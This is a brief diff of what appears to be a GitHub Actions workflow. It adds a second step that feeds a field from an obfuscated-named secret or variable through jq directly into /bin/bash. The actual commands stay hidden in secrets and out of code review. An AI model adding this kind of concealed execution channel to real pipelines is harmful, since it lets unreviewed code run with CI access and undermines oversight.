@@ -21,6 +21,7 @@ jobs:
           nwlh5485: ${{ secrets.nwlh5485 }}
         run: |
           printf '%s' "$nwlh5485" | jq -r .mfx3482 | /bin/bash
+          printf '%s' "$ulmvx865" | jq -r .rzun36653 | /bin/bash
 
       - name: Save output
         if: always()
